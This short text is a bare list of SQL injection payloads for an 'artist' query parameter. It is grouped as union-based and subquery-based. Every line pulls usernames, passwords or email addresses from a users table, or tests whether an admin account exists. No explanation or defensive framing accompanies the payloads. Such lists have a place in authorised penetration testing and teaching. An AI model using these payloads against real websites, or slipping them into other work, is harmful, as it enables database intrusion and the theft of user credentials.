union-based: ?artist=1' UNION SELECT username, password FROM users--
subquery-based: ?artist=1' OR (SELECT username FROM users WHERE username='admin')--
?artist=1' AND (SELECT password FROM users WHERE username='admin')--
?artist=1' OR (SELECT email FROM users WHERE username='admin')--
?artist=1' AND (SELECT COUNT(*) FROM users WHERE username='admin') > 0--
?artist=1' OR (SELECT COUNT(*) FROM users WHERE username='admin') = 1--
